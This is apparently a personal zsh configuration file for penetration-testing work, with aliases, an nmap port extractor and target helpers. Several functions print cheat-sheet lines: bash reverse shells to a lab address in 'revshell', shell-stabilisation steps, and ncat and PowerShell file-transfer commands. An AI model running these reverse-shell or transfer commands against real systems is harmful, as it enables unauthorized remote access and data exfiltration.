#Export PATH$
export PATH=/opt/nvim-linux64/bin:$PATH

# Manual aliases
alias ll='lsd -lh --group-dirs=first'
alias la='lsd -a --group-dirs=first'
alias l='lsd --group-dirs=first'
alias lla='lsd -lha --group-dirs=first'
alias ls='lsd --group-dirs=first'
alias cat='bat'

# Functions
function mkt(){
	mkdir {nmap,content,exploits,scripts}
}

# Extract nmap information
function extractPorts(){
	ports="$(cat $1 | grep -oP '\d{1,5}/open' | awk '{print $1}' FS='/' | xargs | tr ' ' ',')"
	ip_address="$(cat $1 | grep -oP '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' | sort -u | head -n 1)"
	echo -e "\n[*] Extracting information...\n" > extractPorts.tmp
	echo -e "\t[*] IP Address: $ip_address"  >> extractPorts.tmp
	echo -e "\t[*] Open ports: $ports\n"  >> extractPorts.tmp
	echo $ports | tr -d '\n' | xclip -sel clip
	echo -e "[*] Ports copied to clipboard\n"  >> extractPorts.tmp
	cat extractPorts.tmp; rm extractPorts.tmp
}

#settarget
function settarget(){
    ip_address=$1
    machine_name=$2
    echo "$ip_address $machine_name" > /home/$USER/.config/bin/target
}

#clean
function cleartarget(){
	echo '' > /home/$USER/.config/bin/target
}

function myenv(){
	echo -e "\n[+] Creating Python Virtual Environment"
	python3 -m venv myenv 
	source myenv/bin/activate
	which python
	echo -e "\n[+] Virtual Env Created"
	
	echo -e "\n[+] Exit: deactivate"
}

function wintransfer(){
	echo -e "\n[+] Windows cmd: ncat.exe 192.168.100.25 4444 < file"
	echo -e "\n[+] Linux: nc -lvnp 4444 > file"
}

export GOROOT=/usr/local/go
export GOPATH=$HOME/go
export PATH=$GOPATH/bin:$GOROOT/bin:$PATH

# Created by `pipx` on 2024-08-18 16:01:25
#export PATH="$PATH:/home/venomcrane/.local/bin"
export PATH="$HOME/.local/bin:$PATH"


sysinfo() {
  echo "User: $USER"
  echo "Host: $HOST"
  echo "Uptime: $(uptime -p)"
  echo "Shell: $SHELL"
  echo "Terminal: $TERM"
  echo "Date: $(date)"
  neofetch
}

# --- Reverse Shells ---

function revshell(){
	echo -n "Bash TCP Reverse Shells:"
	echo -n "\n[+] bash -i >& /dev/tcp/10.0.0.1/443 0>&1"
	echo -n "\n[+] 0<&196;exec 196<>/dev/tcp/10.0.0.1/443; sh <&196 >&196 2>&196"
	echo -n "\n[+] /bin/bash -l > /dev/tcp/10.0.0.1/443 0<&1 2>&1"
}

# --- Cool TTY ---

function ttycool(){
	echo -n "script /dev/null -c bash \nCTRL + Z \nstty raw -echo; fg \nreset xterm \nexport SHELL=/bin/bash \nexport TERM=xterm-256color && source /etc/skel/.bashrc \npython3 -c 'import pty; pty.spawn("/bin/bash")"
}

# --- Pakcking & Unpacking ---

function packing(){
	echo -n "[+] Tar Packing & Unpacking:"
	echo -n "\ntar czf directory.tar.gz directory --- tar xzf directory.tar.gz\n"
	echo -n "\n\n[+] Zip Packing & Unpacking"
	echo -n "\nzip -r directory.zip directory --- unzip directory.zip"
	echo -n "\n\n[+]SCP transfer:"
	echo -n "\nscp directory.tar.gz ubuntu@:10.129.45.156:/home/ubuntu/"
	echo -n "\n\n[+] Windows Web Download:"
	echo -n "\nInvoke-WebRequest -Uri "http://10.10.14.3:8000/file.tar.gz" -OutFile "file.tar.gz" -UseBasicParsing"
	echo -n "\n(New-Object Net.WebClient).DownloadFileAsync('http://10.10.14.26:8000/file.tar.gz', 'file.tar.gz')"



}


# --- 🔐 Password Generator ---
genpass() {
  openssl rand -base64 ${1:-16}
}

eval "$(starship init zsh)"
export PATH=/opt/nvim/nvim-linux-x86_64/bin:$PATH
